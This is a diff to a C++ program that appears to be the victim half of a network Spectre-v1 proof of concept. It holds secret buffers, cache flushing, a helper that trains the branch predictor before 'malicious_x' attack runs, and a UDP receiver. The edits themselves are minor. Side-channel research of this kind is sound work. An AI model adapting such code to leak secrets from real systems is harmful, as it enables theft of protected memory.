@@ -47,7 +47,7 @@ Victim constants.
 /********************************************************************
 Victim private globals.
 ********************************************************************/
-unsigned int array1_size = 16;
+size_t array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
@@ -58,6 +58,7 @@ constexpr size_t MAX_BUF_LENGTH = 4096;
 char secret_global[MAX_BUF_LENGTH];
 // Contiguous, secret's data exists on heap:
 std::vector<char> secret_heap;
+// Pointer to contiguous secret in main's stack:
 char* secret_stack;
 
 
@@ -183,6 +184,7 @@ void print_config() {
 }
 
 
+
 /********************************************************************
 UDP socket functions.
 ********************************************************************/
@@ -213,7 +215,7 @@ inline void flush_condition() {
       }
 #endif
 
-      /* Delay (can also mfence) */
+      /* Delay until flush completes */
 #ifndef NOMFENCE
       _mm_mfence();
 #else
@@ -228,7 +230,6 @@ inline bool touch_secret(size_t i = 0) {
 
 
 void helper(size_t malicious_x, size_t training_x = 0) {
-  flush_array2(); // ensures side-channel is uncached (optional?)
   volatile bool equal = touch_secret(); // ensures secret is cached (optional?)
 
   /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
@@ -252,8 +253,7 @@ void helper(size_t malicious_x, size_t training_x = 0) {
 
 void recv_worker(uint16_t port = 7777) {
   constexpr size_t ARRAY1_LEN = 16;
-
-  uint8_t buf[2048];
+  uint8_t pkt_buf[2048];
 
   SocketUDP s;
   s.open(port);
@@ -262,9 +262,9 @@ void recv_worker(uint16_t port = 7777) {
 
   size_t tries = 0;
   for (;;) {
-    auto bytes = s.recv(buf, sizeof(buf));
+    auto bytes = s.recv(pkt_buf, sizeof(pkt_buf));
     if (bytes == sizeof(msg)) {
-      msg& m = reinterpret_cast<msg&>(buf);
+      msg& m = reinterpret_cast<msg&>(pkt_buf);
       auto x = m.x;
 
 //#define DEBUG
@@ -291,6 +291,7 @@ void recv_worker(uint16_t port = 7777) {
     }
   }
 }
+
 
 
 /********************************************************************
